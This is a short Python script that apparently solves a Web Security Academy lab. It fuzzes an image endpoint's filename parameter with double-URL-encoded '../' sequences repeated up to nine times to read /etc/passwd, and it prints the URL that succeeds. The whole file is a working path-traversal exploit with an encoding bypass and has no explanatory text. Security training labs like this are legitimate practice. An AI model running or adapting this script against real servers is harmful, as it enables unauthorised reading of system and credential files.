# https://0a1900a4032c9591c051391b00bb002c.web-security-academy.net/image?filename=1.jpg


from requests import get


# . = %252e
dot = "%252e"

# / = %252f
slash = "%252f"

prev = dot + dot + slash


def fuzz():
    for i in range(1, 10):
        url = "https://0a1900a4032c9591c051391b00bb002c.web-security-academy.net/image?filename="
        url += prev * i + "etc%252fpasswd"
        r = get(url)
        print(r.status_code)
        if r.status_code == 200:
            print(url)
            print(r)


fuzz()
